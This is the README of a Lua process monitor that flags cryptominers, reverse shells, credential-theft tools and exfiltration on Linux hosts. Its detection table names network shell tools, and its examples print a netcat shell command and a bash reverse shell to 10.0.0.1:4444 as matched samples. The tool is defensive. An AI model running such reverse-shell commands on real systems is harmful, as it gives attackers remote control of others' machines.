# NullSec ProcMon

Process monitor and threat analyzer built with Lua, demonstrating safe scripting patterns for security tools.

## Security Features

- **Tables with Metatables**: Type-safe process records
- **Nil-Safe Operations**: Safe access to missing fields
- **Pattern Matching**: Lua patterns for threat detection
- **Coroutines**: Async monitoring without callbacks
- **First-Class Functions**: Flexible event handling
- **No Global State**: All state contained in closures

## Detection Capabilities

| Category | Detections |
|----------|------------|
| **Cryptominers** | xmrig, minerd, cpuminer, cgminer, ethminer |
| **Reverse Shells** | nc, ncat, socat, bash -i, /dev/tcp |
| **Recon Tools** | nmap, masscan, nikto, sqlmap |
| **Credential Theft** | mimikatz, lazagne, keylogger |
| **Anti-Forensics** | history -c, shred, log deletion |
| **Privilege Escalation** | SUID manipulation, sudo abuse |
| **Data Exfiltration** | Archive + curl/wget patterns |

## Installation

```bash
# Lua 5.3+ required
lua procmon.lua --help

# Or make executable
chmod +x procmon.lua
./procmon.lua
```

## Usage

```bash
# One-time scan
lua procmon.lua

# Continuous monitoring
lua procmon.lua --monitor

# JSON output
lua procmon.lua --json

# Quiet mode (threats only)
lua procmon.lua -q

# Combined
lua procmon.lua -m -q
```

## API Usage

```lua
local procmon = require("procmon")

-- Get all processes
local processes = procmon.get_processes()
for pid, proc in pairs(processes) do
    print(proc)  -- Uses __tostring metamethod
end

-- Analyze single process
local proc = procmon.Process(1234, "suspicious", "nc -e /bin/sh", 0, 1)
local threats = procmon.analyze_process(proc)

-- Full scan
local threats, processes = procmon.analyze_all()
for _, threat in ipairs(threats) do
    print(threat.level, threat.description)
end

-- Create monitor with callback
local monitor = procmon.create_monitor(2, function(event, proc, threats)
    if event == "new_threat" then
        print("ALERT:", proc.name)
    end
end)

-- Run monitor
while coroutine.status(monitor) ~= "dead" do
    coroutine.resume(monitor)
end
```

## Output Example

```
[CRITICAL] Suspicious process name: xmrig
  PID: 12345  Name: xmrig  UID: 1000
  Cmdline: ./xmrig -o pool.mining.com:3333

[HIGH] Bash reverse shell
  PID: 12346  Name: bash  UID: 0
  Cmdline: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | No threats |
| 1 | Threats found (non-critical) |
| 2 | Critical threats found |

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    ProcMon Architecture                      │
├─────────────────────────────────────────────────────────────┤
│  ┌──────────────┐    ┌──────────────┐    ┌─────────────┐   │
│  │ /proc Reader │───▶│ Process      │───▶│ Threat      │   │
│  │              │    │ Constructor  │    │ Analyzer    │   │
│  └──────────────┘    └──────────────┘    └─────────────┘   │
│         │                   │                   │           │
│         ▼                   ▼                   ▼           │
│   [Raw /proc]        [Process Table]    [Threat Results]   │
│                      with Metatables                        │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              Coroutine Monitor                       │   │
│  │  ┌─────────┐    ┌──────────┐    ┌──────────────┐   │   │
│  │  │ yield() │───▶│ diff PIDs│───▶│ callback()   │   │   │
│  │  └─────────┘    └──────────┘    └──────────────┘   │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

## License

MIT License - Part of the NullSec Framework

## Author

- GitHub: [bad-antics](https://github.com/bad-antics)
- Twitter: [x.com/AnonAntics](https://x.com/AnonAntics)
